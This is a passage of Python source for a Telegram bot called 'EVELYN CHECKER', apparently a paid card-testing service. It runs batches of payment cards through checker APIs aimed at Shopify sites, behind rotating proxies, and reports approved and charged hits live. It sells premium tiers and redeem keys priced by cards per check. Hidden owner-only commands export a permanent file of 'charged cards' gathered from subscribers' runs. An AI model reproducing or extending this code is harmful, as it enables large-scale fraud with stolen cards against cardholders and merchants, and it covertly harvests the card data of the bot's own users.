                        origin_user_id=user_id, user_entity=user_entity,
                    )
                except Exception:
                    pass
            elif is_live_hit_result(res):
                res = _as_approved_result(res)
                all_results['approved'].append(res)
                if not is_otp_result(res):
                    try:
                        await send_realtime_hit(
                            target_chat_id, res, 'Approved', username,
                            origin_user_id=user_id, user_entity=user_entity,
                        )
                    except Exception:
                        pass
            else:
                all_results['dead'].append(res)

            now = time.time()
            if now - last_update_time[0] >= EDIT_INTERVAL and session_key in active_sessions:
                async with progress_lock:
                    now2 = time.time()
                    if now2 - last_update_time[0] >= EDIT_INTERVAL:
                        last_update_time[0] = now2
                        await update_progress(
                            target_chat_id, status_msg.id, all_results, all_results['checked'],
                            range_label=range_label,
                        )

        await update_progress(
            target_chat_id, status_msg.id, all_results, 0, force=True, range_label=range_label,
        )

        # Personal worker limit for this user based on their tier:
        max_workers = get_user_speed_limit(user_id)
        sem = asyncio.Semaphore(max_workers)

        async def worker(card):
            async with sem:
                await run_card(card)

        # Spawn a task for each card
        futures = [asyncio.create_task(worker(card)) for card in cards]

        # Wait for completion; honor /stop by cancelling unfinished futures.
        while futures:
            if session_key not in active_sessions:
                for f in futures:
                    if not f.done():
                        f.cancel()
                break
            done, pending = await asyncio.wait(futures, timeout=1.0)
            futures = list(pending)

        if session_key in active_sessions:
            await update_progress(
                target_chat_id, status_msg.id, all_results, all_results['checked'],
                force=True, range_label=range_label,
            )

    except Exception as e:
        await safe_send(
            lambda: bot.send_message(target_chat_id, premium_emoji(f"An error occurred: {e}"), parse_mode='html'),
            user_id=target_chat_id,
        )
    finally:
        active_sessions.pop(session_key, None)
        chk_session_by_user.pop(user_id, None)
        active_chk_users.discard(user_id)

        try:
            await status_msg.delete()
        except Exception:
            pass

        await send_final_results(target_chat_id, all_results, owner_user_id=user_id)


@bot.on(events.NewMessage(pattern=r'^/proxy(\s|$)'))
async def proxy_command(event):
    """Check all of YOUR proxies and remove dead ones"""
    user_id = event.sender_id

    # Strip malformed entries first — they'd be wasted API calls
    await purge_invalid_user_proxies(user_id)
    proxies = load_user_proxies(user_id)
    if not proxies:
        await event.reply(premium_emoji("❌ <b>You have no proxies saved.</b>\n\nAdd some with <code>/addproxy</code>."), parse_mode='html')
        return

    status_msg = await event.reply(
        premium_emoji(
            f"<b>⚡💳 ᴘ ʀ ᴏ x ʏ ⇢ ᴄ ʜ ᴇ ᴄ ᴋ 💳⚡</b>\n"
            f"<b>━━━━━━━━━━━━━━━━━</b>\n"
            f"<b>🔥 Checking {len(proxies)} proxies...</b>\n"
            f"<b>━━━━━━━━━━━━━━━━━</b>"
        ),
        parse_mode='html'
    )

    alive_proxies = []
    dead_proxies = []
    batch_size = 50

    try:
        for i in range(0, len(proxies), batch_size):
            batch = proxies[i:i + batch_size]
            tasks = [test_proxy(proxy) for proxy in batch]
            results = await asyncio.gather(*tasks)

            for res in results:
                if res['status'] == 'alive':
                    alive_proxies.append(res['proxy'])
                else:
                    dead_proxies.append(res['proxy'])

            # Real-time: user's proxy file update karo har batch ke baad (sirf alive wale)
            async with aiofiles.open(user_proxy_file(user_id), 'w', encoding='utf-8') as f:
                for proxy in alive_proxies:
                    await f.write(f"{proxy}\n")

            checked = len(alive_proxies) + len(dead_proxies)
            is_last = (i + batch_size) >= len(proxies)
            await throttled_edit(
                status_msg,
                premium_emoji(
                    f"⚡️ 𝐄𝐕𝐄𝐋𝐘𝐍 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 ⚡️\n\n"
                    f"<b>🔥 Checking Proxies...</b>\n\n"
                    f"📊 <b>Checked:</b> {checked}/{len(proxies)}\n"
                    f"✅ <b>Alive:</b> {len(alive_proxies)}\n"
                    f"❌ <b>Dead:</b> {len(dead_proxies)}\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━"
                ),
                force=is_last,
                user_id=user_id,
                parse_mode='html'
            )

        summary_msg = (
            f"⚡️ 𝐄𝐕𝐄𝐋𝐘𝐍 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 ⚡️\n\n"
            f"<b>✅ Proxy Check Complete!</b>\n\n"
            f"💳 <b>Total:</b> {len(proxies)}\n"
            f"✅ <b>Alive:</b> {len(alive_proxies)}\n"
            f"❌ <b>Dead:</b> {len(dead_proxies)}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            + bot_by_html()
        )

        await throttled_edit(status_msg, premium_emoji(summary_msg), force=True, user_id=user_id, parse_mode='html')

        # Send ALIVE.txt
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        alive_filename = f"ALIVE_{timestamp}.txt"
        dead_filename = f"DEAD_{timestamp}.txt"

        async with aiofiles.open(alive_filename, 'w', encoding='utf-8') as f:
            for p in alive_proxies:
                await f.write(f"{p}\n")

        async with aiofiles.open(dead_filename, 'w', encoding='utf-8') as f:
            for p in dead_proxies:
                await f.write(f"{p}\n")

        if alive_proxies:
            await bot.send_file(user_id, alive_filename,
                caption=premium_emoji(f"✅ <b>Alive Proxies ({len(alive_proxies)})</b>"),
                parse_mode='html')
        safe_delete(alive_filename)

        if dead_proxies:
            await bot.send_file(user_id, dead_filename,
                caption=premium_emoji(f"❌ <b>Dead Proxies ({len(dead_proxies)})</b>"),
                parse_mode='html')
        safe_delete(dead_filename)

    except Exception as e:
        await throttled_edit(status_msg, premium_emoji(f"❌ An error occurred during proxy check: {e}"), force=True, user_id=user_id, parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/site(\s|$)'))
async def site_command(event):
    """Check all sites and remove dead ones"""
    user_id = event.sender_id

    if not is_owner(user_id):
        await event.reply(premium_emoji("❌ <b>𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱</b>\n\n👑 𝗢𝗻𝗹𝘆 𝗢𝘄𝗻𝗲𝗿 𝗖𝗮𝗻 𝗨𝘀𝗲 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱."), parse_mode='html')
        return

    sites = load_sites()
    if not sites:
        await event.reply(premium_emoji("❌ `sites.txt` is empty. Nothing to check."), parse_mode='html')
        return

    proxies = load_user_proxies(user_id)
    if not proxies:
        await event.reply(premium_emoji("❌ <b>You (owner) have no proxies saved.</b>\n\nAdd some with <code>/addproxy</code> before checking sites."), parse_mode='html')
        return

    status_msg = await event.reply(
        premium_emoji(
            f"<b>⚡💳 ꜱ ɪ ᴛ ᴇ ⇢ ᴄ ʜ ᴇ ᴄ ᴋ 💳⚡</b>\n"
            f"<b>━━━━━━━━━━━━━━━━━</b>\n"
            f"<b>🔥Checking {len(sites)} sites...</b>\n"
            f"<b>━━━━━━━━━━━━━━━━━</b>"
        ),
        parse_mode='html'
    )

    try:
        alive_sites, dead_sites = await run_site_check_batches(sites, user_id, status_msg)
        if alive_sites is None:
            await throttled_edit(
                status_msg,
                premium_emoji("❌ <b>No proxies available.</b> Add proxies with <code>/addproxy</code>."),
                force=True, user_id=user_id, parse_mode='html',
            )
            return

        save_global_sites([site_result_to_entry(res) for res in alive_sites])

        await deliver_site_check_results(user_id, status_msg, sites, alive_sites, dead_sites)

    except Exception as e:
        await throttled_edit(status_msg, premium_emoji(f"❌ An error occurred during site check: {e}"), force=True, user_id=user_id, parse_mode='html')

# Callbacks for Pause/Resume/Stop
@bot.on(events.CallbackQuery(pattern=b"pause"))
async def pause_handler(event):
    user_id = event.sender_id
    msg_id = getattr(event, 'message_id', None) or getattr(event.query, 'msg_id', None)
    session_key = _resolve_chk_session(user_id, msg_id)
    if session_key:
        active_sessions[session_key]['paused'] = True
        await event.answer("Paused")
    else:
        await event.answer("No active check.", alert=True)

@bot.on(events.CallbackQuery(pattern=b"resume"))
async def resume_handler(event):
    user_id = event.sender_id
    msg_id = getattr(event, 'message_id', None) or getattr(event.query, 'msg_id', None)
    session_key = _resolve_chk_session(user_id, msg_id)
    if session_key:
        active_sessions[session_key]['paused'] = False
        await event.answer("Resumed")
    else:
        await event.answer("No active check.", alert=True)

@bot.on(events.CallbackQuery(pattern=b"stop"))
async def stop_handler(event):
    user_id = event.sender_id
    msg_id = getattr(event, 'message_id', None) or getattr(event.query, 'msg_id', None)
    if _stop_chk_session(user_id, msg_id):
        await event.answer("Stopped")
        try:
            await event.edit(
                premium_emoji("😡 <b>Checking stopped by user.</b>"),
                parse_mode='html',
            )
        except Exception:
            pass
    else:
        await event.answer("No active check.", alert=True)

@bot.on(events.NewMessage(pattern=r'^/pr(\s|$)'))
async def add_premium_days(event):
    """Owner only — /pr <user_id> <days> [tier]   (days=0 → lifetime)"""
    if not is_owner(event.sender_id):
        return

    args = event.message.text.split()
    if len(args) < 3:
        tiers_help = ' · '.join(f"{t} {m['limit']:,}" for t, m in PREMIUM_TIERS.items())
        await event.reply(
            premium_emoji(
                "Usage: <code>/pr &lt;user_id&gt; &lt;days&gt; [tier]</code>\n"
                f"Tiers: {tiers_help}\n(use 0 days for lifetime)"
            ),
            parse_mode='html',
        )
        return

    uid, days_str = args[1].strip(), args[2].strip()
    tier = _resolve_tier_name(args[3]) if len(args) >= 4 else DEFAULT_PREMIUM_TIER
    if not uid.lstrip('-').isdigit() or not days_str.lstrip('-').isdigit():
        await event.reply(premium_emoji("❌ Invalid arguments."), parse_mode='html')
        return
    if len(args) >= 4 and not tier:
        await event.reply(
            premium_emoji("❌ Invalid tier. Use: basic, pro, max, ultra"),
            parse_mode='html',
        )
        return

    days = int(days_str)
    tier = tier or DEFAULT_PREMIUM_TIER
    tier_meta = PREMIUM_TIERS[tier]
    data = _load_json(PREMIUM_JSON, {})
    existing = _normalize_premium_entry(data.get(uid))
    if days == 0:
        new_exp = 0
        exp_label = "Lifetime"
    else:
        base = float((existing or {}).get('exp') or 0)
        if base <= time.time():
            base = time.time()
        new_exp = base + days * 86400
        exp_label = datetime.fromtimestamp(new_exp).strftime("%d/%m/%Y %H:%M")

    keep_limit = int((existing or {}).get('limit') or 0)
    new_limit = max(keep_limit, tier_meta['limit'])
    new_tier = tier
    if existing and keep_limit > tier_meta['limit']:
        new_tier = existing.get('tier', tier)

    data[uid] = {'exp': new_exp, 'tier': new_tier, 'limit': new_limit}
    await _save_json(PREMIUM_JSON, data)
    final_meta = PREMIUM_TIERS.get(new_tier, tier_meta)
    await event.reply(
        premium_emoji(
            f"✅ <b>Premium granted</b>\n"
            f"🤯 User: <code>{uid}</code>\n"
            f"💎 Tier: <b>{final_meta['label']}</b> ({new_limit:,} cards/chk)\n"
            f"⌛️ Days: <b>{days}</b>\n"
            f"📅 Expires: <b>{exp_label}</b>"
        ),
        parse_mode='html',
    )


@bot.on(events.NewMessage(pattern=r'^/kick'))
async def remove_premium_id(event):
    """Hidden command — revoke premium (premium.json + legacy premium.txt). Owner only."""
    if not is_owner(event.sender_id):
        return  # Silent ignore

    args = event.message.text.split()
    if len(args) < 2:
        await event.reply("Usage: /kick <user_id>", parse_mode='html')
        return

    uid = args[1].strip()
    if not uid.lstrip('-').isdigit():
        await event.reply(premium_emoji("❌ Invalid user ID."), parse_mode='html')
        return

    removed_txt = False
    current = get_file_lines(PREMIUM_FILE)
    if uid in current:
        async with aiofiles.open(PREMIUM_FILE, 'w', encoding='utf-8') as f:
            for line_uid in current:
                if line_uid != uid:
                    await f.write(f"{line_uid}\n")
        removed_txt = True

    removed_json = False
    data = _load_json(PREMIUM_JSON, {})
    json_key = next((k for k in data if str(k) == uid), None)
    if json_key is not None:
        data.pop(json_key, None)
        await _save_json(PREMIUM_JSON, data)
        removed_json = True

    if not removed_txt and not removed_json:
        await event.reply(
            premium_emoji(f"❌ <code>{uid}</code> not found in premium list."),
            parse_mode='html',
        )
        return

    await event.reply(
        premium_emoji(f"✅ <code>{uid}</code> removed from premium."),
        parse_mode='html',
    )


# ─── /list — Premium user roster (owner only, hidden) ──────────────────
_TIER_BADGES = {
    'basic': '🥉',
    'pro':   '🥈',
    'max':   '🥇',
    'ultra': '💎',
}
_LIST_PER_PAGE = 10
_list_cache = {}  # msg_id -> {'entries': [...], 'owner_id': int}

def _build_list_page(entries, page, total_pages):
    """Build the HTML text for a single page of the premium roster."""
    start = page * _LIST_PER_PAGE
    end = start + _LIST_PER_PAGE
    page_entries = entries[start:end]

    header = (
        f'<b>👑 ᴘ ʀ ᴇ ᴍ ɪ ᴜ ᴍ  ʀ ᴏ s ᴛ ᴇ ʀ</b>\n'
        f'<b>━━━━━━━━━━━━━━━━━━</b>\n'
        f'<b>⚡ {len(entries)} active subscribers</b>\n'
        f'<b>━━━━━━━━━━━━━━━━━━</b>\n'
    )

    lines = []
    for e in page_entries:
        badge = _TIER_BADGES.get(e['tier'], '⭐')
        tier_label = PREMIUM_TIERS.get(e['tier'], {}).get('label', e['tier'].title())
        lines.append(
            f'{badge} <b>{e["uname"]}</b>\n'
            f'    ├ Plan: <b>{tier_label}</b> ({e["limit"]:,} cards)\n'
            f'    └ Expires: <code>{e["days_left"]}</code>'
        )

    body = '\n\n'.join(lines)
    footer = (
        f'\n\n<b>━━━━━━━━━━━━━━━━━━</b>\n'
        f'📄 Page <b>{page + 1}</b> / <b>{total_pages}</b>  •  '
        f'💎 Ultra  🥇 Max  🥈 Pro  🥉 Basic'
    )

    return header + body + footer

def _build_list_buttons(page, total_pages):
    """Build inline navigation buttons for the premium roster."""
    buttons = []
    if page > 0:
        buttons.append(Button.inline('◀ Back', f'plist:{page - 1}'.encode()))
    if page < total_pages - 1:
        buttons.append(Button.inline('Next ▶', f'plist:{page + 1}'.encode()))
    return [buttons] if buttons else None

@bot.on(events.NewMessage(pattern=r'^/list$'))
async def premium_list_handler(event):
    if not is_owner(event.sender_id):
        return

    # Gather all premium users from both sources
    legacy_uids = set(get_file_lines(PREMIUM_FILE))
    json_data = _load_json(PREMIUM_JSON, {})

    all_uids = set(json_data.keys()) | legacy_uids
    if not all_uids:
        await event.reply(premium_emoji('📋 No premium users found.'), parse_mode='html')
        return

    entries = []
    now = time.time()
    for uid in all_uids:
        entry = None
        if uid in json_data:
            entry = _normalize_premium_entry(json_data[uid])
        if not entry and uid in legacy_uids:
            entry = {'exp': 0, 'tier': DEFAULT_PREMIUM_TIER, 'limit': PREMIUM_TIERS[DEFAULT_PREMIUM_TIER]['limit']}

        if not entry or not _premium_entry_active(entry):
            continue

        tier = entry.get('tier', DEFAULT_PREMIUM_TIER)
        exp = entry.get('exp', 0)
        limit = entry.get('limit', PREMIUM_TIERS.get(tier, {}).get('limit', 0))

        if exp == 0:
            days_left = '∞'
            sort_key = float('inf')
        else:
            remaining = float(exp) - now
            days = max(0, int(remaining / 86400))
            days_left = f'{days}d'
            sort_key = remaining

        # Try to get username
        try:
            user_entity = await bot.get_entity(int(uid))
            uname = f'@{user_entity.username}' if user_entity.username else user_entity.first_name or uid
        except Exception:
            uname = uid

        entries.append({
            'uid': uid, 'uname': uname, 'tier': tier,
            'limit': limit, 'days_left': days_left, 'sort_key': sort_key,
        })

    if not entries:
        await event.reply(premium_emoji('📋 No active premium users.'), parse_mode='html')
        return

    # Sort: lifetime first, then by days remaining (most → least)
    entries.sort(key=lambda e: -e['sort_key'])

    total_pages = max(1, -(-len(entries) // _LIST_PER_PAGE))  # ceil division
    page = 0
    text = premium_emoji(_build_list_page(entries, page, total_pages))
    buttons = _build_list_buttons(page, total_pages)
    msg = await event.reply(text, parse_mode='html', buttons=buttons)

    # Cache entries for this message so button clicks can rebuild pages
    _list_cache[msg.id] = {'entries': entries, 'owner_id': event.sender_id}


@bot.on(events.CallbackQuery(pattern=rb'plist:(\d+)'))
async def premium_list_page_handler(cb):
    if not is_owner(cb.sender_id):
        await cb.answer('⛔', alert=False)
        return

    cache = _list_cache.get(cb.message_id)
    if not cache:
        await cb.answer('Expired — use /list again', alert=True)
        return

    page = int(cb.pattern_match.group(1))
    entries = cache['entries']
    total_pages = max(1, -(-len(entries) // _LIST_PER_PAGE))

    if page < 0 or page >= total_pages:
        await cb.answer()
        return

    text = premium_emoji(_build_list_page(entries, page, total_pages))
    buttons = _build_list_buttons(page, total_pages)
    await cb.edit(text, parse_mode='html', buttons=buttons)
    await cb.answer()


# ─── /getch & /removech — Permanent charge log (owner only, hidden) ────
@bot.on(events.NewMessage(pattern=r'^/getch$'))
async def getch_cmd(event):
    if not is_owner(event.sender_id):
        return
    try:
        if not os.path.exists(_CHARGE_PERM_FILE):
            await event.reply('📋 No charges collected yet.')
            return
        size = os.path.getsize(_CHARGE_PERM_FILE)
        if size == 0:
            await event.reply('📋 Charge file is empty.')
            try:
                os.remove(_CHARGE_PERM_FILE)
            except Exception:
                pass
            return
        # Count lines
        with open(_CHARGE_PERM_FILE, 'r', encoding='utf-8') as f:
            line_count = sum(1 for l in f if l.strip())
        size_mb = size / (1024 * 1024)
        # Telegram bot file limit is ~50MB — split if needed
        if size <= 45 * 1024 * 1024:  # under 45MB, send directly
            caption = f'⚡ {line_count:,} charged cards ({size_mb:.1f} MB)'
            await bot.send_file(
                event.chat_id,
                _CHARGE_PERM_FILE,
                caption=caption,
                force_document=True,
            )
        else:
            # Split into parts
            part_num = 0
            part_lines = []
            part_size = 0
            max_part = 40 * 1024 * 1024  # 40MB per part
            with open(_CHARGE_PERM_FILE, 'r', encoding='utf-8') as f:
                for line in f:
                    part_lines.append(line)
                    part_size += len(line.encode('utf-8'))
                    if part_size >= max_part:
                        part_num += 1
                        part_file = os.path.join(_DATA_DIR, f'charges_part{part_num}.txt')
                        with open(part_file, 'w', encoding='utf-8') as pf:
                            pf.writelines(part_lines)
                        await bot.send_file(
                            event.chat_id, part_file,
                            caption=f'⚡ Part {part_num} ({len(part_lines):,} cards)',
                            force_document=True,
                        )
                        try:
                            os.remove(part_file)
                        except Exception:
                            pass
                        part_lines = []
                        part_size = 0
            # Remaining lines
            if part_lines:
                part_num += 1
                part_file = os.path.join(_DATA_DIR, f'charges_part{part_num}.txt')
                with open(part_file, 'w', encoding='utf-8') as pf:
                    pf.writelines(part_lines)
                await bot.send_file(
                    event.chat_id, part_file,
                    caption=f'⚡ Part {part_num} ({len(part_lines):,} cards) — final',
                    force_document=True,
                )
                try:
                    os.remove(part_file)
                except Exception:
                    pass
            await event.reply(f'📦 Sent {part_num} parts ({line_count:,} total cards, {size_mb:.1f} MB)')
    except Exception as e:
        await event.reply(f'❌ Error: {str(e)[:200]}')


@bot.on(events.NewMessage(pattern=r'^/removech$'))
async def removech_cmd(event):
    if not is_owner(event.sender_id):
        return
    try:
        if not os.path.exists(_CHARGE_PERM_FILE):
            await event.reply('📋 No charge file to clear.')
            return
        size = os.path.getsize(_CHARGE_PERM_FILE)
        if size == 0:
            try:
                os.remove(_CHARGE_PERM_FILE)
            except Exception:
                pass
            await event.reply('📋 File was already empty. Cleared.')
            return
        # Count lines
        with open(_CHARGE_PERM_FILE, 'r', encoding='utf-8') as f:
            line_count = sum(1 for l in f if l.strip())
        size_mb = size / (1024 * 1024)
        # Send backup to owner first
        caption = f'🗄️ Backup before clear: {line_count:,} cards ({size_mb:.1f} MB)'
        if size <= 45 * 1024 * 1024:
            await bot.send_file(
                OWNER_ID,
                _CHARGE_PERM_FILE,
                caption=caption,
                force_document=True,
            )
        else:
            # Too large — send in parts
            part_num = 0
            part_lines = []
            part_size = 0
            max_part = 40 * 1024 * 1024
            with open(_CHARGE_PERM_FILE, 'r', encoding='utf-8') as f:
                for line in f:
                    part_lines.append(line)
                    part_size += len(line.encode('utf-8'))
                    if part_size >= max_part:
                        part_num += 1
                        part_file = os.path.join(_DATA_DIR, f'charges_backup{part_num}.txt')
                        with open(part_file, 'w', encoding='utf-8') as pf:
                            pf.writelines(part_lines)
                        await bot.send_file(
                            OWNER_ID, part_file,
                            caption=f'🗄️ Backup part {part_num}',
                            force_document=True,
                        )
                        try:
                            os.remove(part_file)
                        except Exception:
                            pass
                        part_lines = []
                        part_size = 0
            if part_lines:
                part_num += 1
                part_file = os.path.join(_DATA_DIR, f'charges_backup{part_num}.txt')
                with open(part_file, 'w', encoding='utf-8') as pf:
                    pf.writelines(part_lines)
                await bot.send_file(
                    OWNER_ID, part_file,
                    caption=f'🗄️ Backup part {part_num} — final',
                    force_document=True,
                )
                try:
                    os.remove(part_file)
                except Exception:
                    pass
        # Now clear the permanent file
        os.remove(_CHARGE_PERM_FILE)
        await event.reply(f'✅ Charge file cleared. Backup sent ({line_count:,} cards).\nNew charges will start collecting now.')
    except Exception as e:
        await event.reply(f'❌ Error: {str(e)[:200]}')


# ─── Key System ────────────────────────────────────────────────────────
@bot.on(events.NewMessage(pattern=r'^/genkey(\s|$)'))
async def gen_key_cmd(event):
    """Owner only — /genkey <tier> <days> [count]   Generates redeem keys."""
    if not is_owner(event.sender_id):
        return
    args = event.message.text.split()
    tiers_help = ' · '.join(f"{t} ({m['limit']:,})" for t, m in PREMIUM_TIERS.items())
    if len(args) < 3:
        await event.reply(
            premium_emoji(
                "Usage: <code>/genkey &lt;tier&gt; &lt;days&gt; [count]</code>\n"
                f"Tiers: {tiers_help}"
            ),
            parse_mode='html',
        )
        return

    tier = _resolve_tier_name(args[1])
    if not tier or not args[2].isdigit():
        await event.reply(
            premium_emoji(
                "❌ Invalid usage.\n"
                f"<code>/genkey &lt;tier&gt; &lt;days&gt; [count]</code>\n"
                f"Tiers: {tiers_help}"
            ),
            parse_mode='html',
        )
        return

    days = int(args[2])
    count = int(args[3]) if len(args) >= 4 and args[3].isdigit() else 1
    count = max(1, min(count, 50))
    tier_meta = PREMIUM_TIERS[tier]

    keys = _load_json(KEYS_FILE, {})
    new_keys = []
    for _ in range(count):
        k = _gen_key(prefix=tier_meta['prefix'])
        while k in keys:
            k = _gen_key(prefix=tier_meta['prefix'])
        keys[k] = {
            "days": days,
            "tier": tier,
            "limit": tier_meta['limit'],
            "used_by": None,
            "used_at": None,
        }
        new_keys.append(k)
    await _save_json(KEYS_FILE, keys)

    body = "\n".join(k for k in new_keys)
    await event.reply(
        premium_emoji(
            f"🎁 <b>Generated {count} {tier_meta['label']} key(s)</b>\n"
            f"💳 Limit: <b>{tier_meta['limit']:,}</b> cards/chk · {days} day(s) each\n\n"
            f"<pre>{body}</pre>\n\n"
            f"Redeem: <code>/redeem KEY</code> or reply to this message with <code>/redeem</code>"
        ),
        parse_mode='html',
    )


@bot.on(events.NewMessage(pattern=r'^/redeem(?:@\w+)?(\s|$)'))
async def redeem_key_cmd(event):
    """Any user — /redeem <key>   Activates premium for the days bound to the key."""
    candidates = await _extract_redeem_keys_from_event(event)
    if not candidates:
        await event.reply(
            premium_emoji(
                "Usage: <code>/redeem YOUR-KEY-HERE</code>\n"
                "Or <b>reply</b> to a key message with <code>/redeem</code>\n"
                "(multi-key message → first <b>unused</b> key is redeemed)"
            ),
            parse_mode='html',
        )
        return
    keys = _load_json(KEYS_FILE, {})
    storage_key = None
    info = None
    saw_used = False
    for candidate in candidates:
        sk, inf = _lookup_redeem_key(keys, candidate)
        if not inf:
            continue
        if inf.get('used_by'):
            saw_used = True
            continue
        storage_key, info = sk, inf
        break
    if not info:
        if saw_used:
            await event.reply(
                premium_emoji('⚠️ <b>All keys in that message are already redeemed.</b>'),
                parse_mode='html',
            )
        else:
            await event.reply(premium_emoji('❌ <b>Invalid key.</b>'), parse_mode='html')
        return
    key = storage_key
    uid = str(event.sender_id)
    REDEEM_COOLDOWN = 3 * 3600

    async with _redeem_lock:
        keys = _load_json(KEYS_FILE, {})
        info = keys.get(key)
        if not info or info.get('used_by'):
            await event.reply(
                premium_emoji('⚠️ <b>That key was just redeemed by someone else.</b> Try another.'),
                parse_mode='html',
            )
            return

        now_ts = time.time()
        last_redeem = 0.0
        for _k, _i in keys.items():
            if _i.get("used_by") == uid and _i.get("used_at"):
                try:
                    if float(_i["used_at"]) > last_redeem:
                        last_redeem = float(_i["used_at"])
                except (TypeError, ValueError):
                    pass
        if last_redeem and (now_ts - last_redeem) < REDEEM_COOLDOWN:
            remaining = int(REDEEM_COOLDOWN - (now_ts - last_redeem))
            hrs = remaining // 3600
            mins = (remaining % 3600) // 60
            await event.reply(
                premium_emoji(
                    f"⏳ <b>Cooldown active.</b>\nYou can redeem another key in <b>{hrs}h {mins}m</b>."
                ),
                parse_mode='html',
            )
            return

        days = int(info["days"])
        key_tier = _resolve_tier_name(info.get('tier')) or _tier_from_key_prefix(key) or DEFAULT_PREMIUM_TIER
        key_limit = int(info.get('limit') or PREMIUM_TIERS[key_tier]['limit'])
        tier_meta = PREMIUM_TIERS[key_tier]

        data = _load_json(PREMIUM_JSON, {})
        existing = _normalize_premium_entry(data.get(uid))
        if days == 0:
            new_exp = 0
            exp_label = "Lifetime"
        else:
            base = float((existing or {}).get('exp') or 0)
            if base <= time.time():
                base = time.time()
            new_exp = base + days * 86400
            exp_label = datetime.fromtimestamp(new_exp).strftime("%d/%m/%Y %H:%M")

        keep_limit = int((existing or {}).get('limit') or 0)
        new_limit = max(keep_limit, key_limit)
        new_tier = key_tier
        if existing and keep_limit > key_limit:
            new_tier = existing.get('tier', key_tier)
            tier_meta = PREMIUM_TIERS.get(new_tier, tier_meta)

        data[uid] = {'exp': new_exp, 'tier': new_tier, 'limit': new_limit}
        await _save_json(PREMIUM_JSON, data)

        info["used_by"] = uid
        info["used_at"] = time.time()
        keys[key] = info
        await _save_json(KEYS_FILE, keys)

    extra = ''
    if len(candidates) > 1:
        extra = f"\n🔑 Key: <code>{key}</code> (1 of {len(candidates)} in message)"
    await event.reply(
        premium_emoji(
            f"✅ <b>Key redeemed!</b>\n"
            f"💎 Tier: <b>{tier_meta['label']}</b> ({new_limit:,} cards/chk)\n"
            f"⏳ Duration: <b>{days}</b> day(s)\n"
            f"📅 Expires: <b>{exp_label}</b>{extra}"
        ),
        parse_mode='html',
    )


# ─── Owner checker API control (hidden — not in /start) ─────────────────
@bot.on(events.NewMessage(pattern=r'^/apiconfig$'))
async def apiconfig_handler(event):
    if not is_owner(event.sender_id):
        return
    mgr = get_checker_manager()
    apis = get_checker_apis_config()
    text = premium_emoji(
        f'<b>⚙️ Checker APIs</b> (owner)\n'
        f'{mgr.workers_summary_text()} — cards round-robin across enabled APIs\n'
    )
    for api in apis:
        state = 'on' if api.get('enabled') else 'off'
        role = api.get('role', 'primary')
        role_icon = '🔄' if role == 'fallback' else '⚡'
        text += premium_emoji(
            f'\n\n{role_icon} <b><code>{api["id"]}</code></b> ({api.get("name", api["id"])}) — {state}\n'
            f'Role: <b>{role}</b> | Workers: {api.get("max_workers", 15)}\n'
            f'URL: <code>{api.get("url", "")}</code>'
        )
    await event.reply(text, parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/apiworkers\s+'))
async def apiworkers_handler(event):
    if not is_owner(event.sender_id):
        return
    parts = (event.text or '').split()
    if len(parts) != 3:
        await event.reply(
            premium_emoji(
                'Usage:\n'
                '<code>/apiworkers api1 150</code>\n'
                '<code>/apiworkers all 150</code>'
            ),
            parse_mode='html',
        )
        return
    try:
        n = int(parts[2])
    except ValueError:
        await event.reply(
            premium_emoji(f'Workers must be a number 1–{ABSOLUTE_MAX_API_WORKERS}.'),
            parse_mode='html',
        )
        return
    api_key = parts[1].lower()
    if api_key == 'all':
        saved = set_all_checker_api_workers(n)
        if not saved:
            await event.reply(premium_emoji('No checker APIs configured.'), parse_mode='html')
            return
        await event.reply(
            premium_emoji(
                f'✅ All APIs max workers set to <b>{saved}</b>.'
            ),
            parse_mode='html',
        )
        return
    if not set_checker_api_workers(parts[1], n):
        await event.reply(premium_emoji('Unknown API id. Use <code>/apiconfig</code>.'), parse_mode='html')
        return
    saved = _normalize_api_workers(n)
    await event.reply(
        premium_emoji(
            f'✅ <code>{parts[1]}</code> max workers set to <b>{saved}</b>.\n'
            f'⚡ Total API workers: <b>{get_checker_manager().total_workers()}</b>'
        ),
        parse_mode='html',
    )


@bot.on(events.NewMessage(pattern=r'^/dispatchworkers\s*'))
async def dispatchworkers_handler(event):
    if not is_owner(event.sender_id):
        return
    await event.reply(
        premium_emoji(
            '⚠️ The shared dispatch pool has been removed.\n'
            'Please use <code>/workers</code> to view and configure per-plan concurrent worker limits.'
        ),
        parse_mode='html',
    )


@bot.on(events.NewMessage(pattern=r'^/apiurl\s+'))
async def apiurl_handler(event):
    if not is_owner(event.sender_id):
        return
    parts = (event.text or '').split(maxsplit=2)
    if len(parts) < 3:
        await event.reply(
            premium_emoji('Usage: <code>/apiurl api2 https://host/shopify</code>'),
            parse_mode='html',
        )
        return
    if not set_checker_api_url(parts[1], parts[2]):
        await event.reply(premium_emoji(f'Unknown API id <code>{parts[1]}</code>.'), parse_mode='html')
        return
    await event.reply(premium_emoji(f'✅ URL updated for <code>{parts[1]}</code>.'), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/apienable\s+'))
async def apienable_handler(event):
    if not is_owner(event.sender_id):
        return
    parts = (event.text or '').split()
    if len(parts) != 3:
        await event.reply(premium_emoji('Usage: <code>/apienable api2 on</code> or <code>off</code>'), parse_mode='html')
        return
    enabled = parts[2].lower() in ('on', '1', 'true', 'yes', 'enable')
    if not set_checker_api_enabled(parts[1], enabled):
        await event.reply(premium_emoji(f'Unknown API id <code>{parts[1]}</code>.'), parse_mode='html')
        return
    state = 'enabled' if enabled else 'disabled'
    await event.reply(premium_emoji(f'✅ <code>{parts[1]}</code> is now <b>{state}</b>.'), parse_mode='html')


@bot.on(events.NewMessage(pattern=r'^/apirole\s+'))
async def apirole_handler(event):
    if not is_owner(event.sender_id):
        return
    parts = (event.text or '').split()
    if len(parts) != 3 or parts[2].lower() not in ('primary', 'fallback'):
        await event.reply(premium_emoji('Usage: <code>/apirole api3 fallback</code> or <code>/apirole api3 primary</code>'), parse_mode='html')
        return
    role = parts[2].lower()
    apis = get_checker_apis_config()
    found = False
    for api in apis:
        if api['id'] == parts[1]:
            api['role'] = role
            found = True
            break
    if not found:
